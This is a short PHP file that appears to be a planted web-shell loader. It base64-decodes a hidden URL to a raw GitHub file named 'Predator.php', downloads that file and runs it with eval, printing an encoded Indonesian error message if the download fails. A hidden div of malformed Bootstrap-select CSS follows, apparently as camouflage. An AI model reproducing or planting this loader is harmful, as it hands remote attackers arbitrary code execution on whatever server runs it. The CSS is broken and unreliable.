<?php
function x($s) {
    return base64_decode($s);
}

$a = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW5na3VCdWthbkF5YW5nbXUvbWF0cmVrL3JlZnMvaGVhZHMvbWFpbi9QcmVkYXRvci5waHA=';

$src = x($a);

$errorMsg = x('R2FnbGFsIG1lbmdnaWthbiBmaWxlLg==');

$code = file_get_contents($src);
if ($code !== false) {
    eval("?>".$code);
} else {
    echo $errorMsg;
}
?>

<div class="external-content">
<div style="display:none">
.bootstrap-select > .dropdown-toggle 
  position: relative;
  width: 100%;
  padding-right: 25px;
  z-index: 1;

.bootstrap-select > .dropdown-toggle.bs-placeholder,
.bootstrap-select > .dropdown-toggle.bs-placeholder:hover,
.bootstrap-select > .dropdown-toggle.bs-placeholder:focus,
.bootstrap-select > .dropdown-toggle.bs-placeholder:active 
  color: #999;

.bootstrap-select > select 
  position: absolute !important;
  bottom: 0;
  left: 50%;
  display: block !important;
  width: 0.5px !important;
  height: 100% !important;
  padding: 0 !important;
  opacity: 0 !important;
  border: none;

.bootstrap-select > select.mobile-device 
  top: 0;
  left: 0;
  display: block !important;
  width: 100% !important;
  z-index: 2

.has-error .bootstrap-select .dropdown-toggle,
.error .bootstrap-select .dropdown-toggle,
.bootstrap-select.is-invalid .dropdown-toggle,
.was-validated .bootstrap-select .selectpicker:invalid + .dropdown-toggle 
  border-color: #b94a48;

.bootstrap-select.is-valid .dropdown-toggle,
.was-validated .bootstrap-select .selectpicker:valid + .dropdown-toggle 
  border-color: #28a745;

.bootstrap-select.fit-width 
  width: auto !important;

.bootstrap-select:not([class*="col-"]):not([class*="form-control"]):not(.input-group-btn) 
  width: 220px;

.bootstrap-select .dropdown-toggle:focus 
  outline: thin dotted #333333 !important;
  outline: 5px auto -webkit-focus-ring-color !important
  outline-offset: -2px;

.bootstrap-select.form-control 
  margin-bottom: 0;
  padding: 0;
  border: none;

.bootstrap-select.form-control:not([class*="col-"]) 
  width: 100%;

.bootstrap-select.form-control.input-group-btn {
  z-index: auto;

.bootstrap-select.form-control.input-group-btn:not(:first-child):not(:last-child) > .btn 
  border-radius: 0;

.bootstrap-select:not(.input-group-btn),
.bootstrap-select[class*="col-"] 
  float: none;
  display: inline-block;
  margin-left: 0;

.bootstrap-select.dropdown-menu-right,
.bootstrap-select[class*="col-"].dropdown-menu-right,
.row .bootstrap-select[class*="col-"].dropdown-menu-right 
  float: right;

.form-inline .bootstrap-select,
.form-horizontal .bootstrap-select,
.form-group .bootstrap-select 
  margin-bottom: 0;

.form-group-lg .bootstrap-select.form-control,
.form-group-sm .bootstrap-select.form-control 
  padding: 0;
 </div>
    </div>
